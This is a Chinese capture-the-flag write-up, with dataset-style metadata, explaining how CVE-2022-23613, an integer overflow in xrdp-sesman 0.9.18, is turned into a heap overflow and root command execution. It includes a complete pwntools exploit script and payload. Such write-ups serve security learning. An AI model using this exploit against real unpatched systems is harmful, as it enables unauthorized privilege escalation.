---
title: 2022 强网杯 final - RDP
contest: 2022 强网杯 final
year: 2022
difficulty: hard
vuln_type: [pwn_unknown, auth_bypass]
tags: [XRDP, xrdp-sesman, CVE-2022-23613, integer-overflow, heap-overflow, g_execlp3, rdi-control, heap-spray, MAX_SHORT_LIVED_CONNECTIONS]
attack_chain: ["识别 xrdp-sesman 0.9.18 已知 CVE-2022-23613（header_size 整型溢出）", "CVE patch 单点修改：限制 header_size 上限", "poc：发送 'vvvv' + 0x80000000 (大端) 触发 to_read 负溢出", "to_read = self->header_size - read_so_far，0x80000000 - 小数 = 巨大正数", "trans_recv 接受 0x4160 字节，in_s 缓冲区只有 8192 → 堆溢出", "diff 把 MAX_SHORT_LIVED_CONNECTIONS 从 16 改成 512 → 堆喷更容易", "用 g_execlp3（system 风格）覆盖 trans->trans_can_recv 函数指针", "rdi = trans 结构体头 = 命令字符串", "rdi 写 '/tmp/do\\x00' 命令文件做提权脚本"]
key_payload: "p32(0x80000000)[::-1] + 'a'*0x4160 + '/tmp/do\\x00'"
one_liner: CVE-2022-23613 整型溢出堆溢出 + rdi 控命令 + g_execlp3 提权
lesson: 老 CVE 重现是 0day 防御学习的捷径；整数溢出导致"超大 to_read"是堆溢出经典
quality: high
---

# 2022 强网杯 final - RDP

原文 https://www.ctfiot.com/151803.html （看雪 Ayakaaa）

## 题目
- 攻击 XRDP 程序，本地提权
- 服务：xrdp-sesman 0.9.18
- 端口：3350
- 提权提示：作者给了 diff

## 漏洞识别
CVE-2022-23613 — xrdp sesman.c `header_size` 整型溢出
- 漏洞 patch URL: https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa
- 改动：限制 header_size 上限

## 漏洞链
```c
// sesman.c sesman_data_in
in_uint32_be(self->in_s, version);  // 接收 4 字节版本
in_uint32_be(self->in_s, size);     // 用户可控 size

// trans_check_wait_objs
read_so_far = (int)(self->in_s->end - self->in_s->data);
to_read = self->header_size - read_so_far;  // 关键
if (to_read > 0) {
    read_bytes = self->trans_recv(self, self->in_s->end, to_read);
    // in_s 缓冲区只有 8192，to_read 可以巨大
}
```

**利用：**
- `header_size = 0x80000000`（int 最小负数）
- `to_read = 0x80000000 - read_so_far` → 巨大正数
- `trans_recv` 写远超缓冲区大小 → 堆溢出

## 利用
```python
from pwn import *

elf = ELF('./xrdp-sesman')
bss = 0x40a000
system_plt = elf.plt['g_execlp3']

# 1) 堆喷（diff 把 MAX_SHORT_LIVED_CONNECTIONS 改 16→512）
conn_list = []
for i in range(100):
    conn_list.append(remote("127.0.0.1", 3350))

# 2) 触发 header_size 整型溢出
io1 = conn_list[97]
payload = b'v' * 4 + p32(0x80000000)[::-1]  # 大端
io1.send(payload)

# 3) 堆溢出覆盖 trans->trans_can_recv = g_execlp3
#    rdi = trans 结构体头 = 命令字符串
payload = p64(bss) * (0x4160 // 8) + p64(0x2b0) + b'/tmp/do\x00'
payload += p32(1) * 2 + p64(2) + p64(0) * 3 + p64(0x400318) + p64(bss) * 2
payload += p64(0) * 71 + p64(0x403BF0) + p64(0x403C40) * 2
io1.send(payload)

# 4) 触发：让 98 号 conn 发数据 → sesman 调用 trans_can_recv
#    rdi 指向 trans 头 → 命令字符串 "/tmp/do"
conn_list[98].send(b'a' * 8)
```

```bash
# /tmp/do 内容
#!/bin/bash
echo "Ayaka" > /flag
chmod a+x /tmp/do
```

## 关键点
- **大端序**：`p32(0x80000000)[::-1]` 切记网络字节序
- **堆喷**：diff 把 `MAX_SHORT_LIVED_CONNECTIONS` 从 16 改成 512，让 trans 结构体在堆上密集分布
- **rdi 控制**：trans 结构体头部正好是 `in_uint32_be` 第一个字段写入的位置 → 命令字符串
- **g_execlp3**：xrdp 内部的 `execlp` 包装，等价于 `system("rdi")`

## 教学价值
- 真实 CVE 复现赛题：把生产漏洞搬到比赛
- 整数溢出 → 逻辑绕过 → 堆溢出 → 函数指针覆盖
- 函数指针覆盖时 rdi 恰好指向结构体头，是 RDP 这类协议栈的天然优势
- 整数溢出利用：to_read 为 int 但 header_size 很大时相减会变负数变巨正数

## CVE 信息
- CVE-2022-23613
- xrdp < 0.9.19
- xrdp 0.9.19 patch: 限制 header_size < in_size
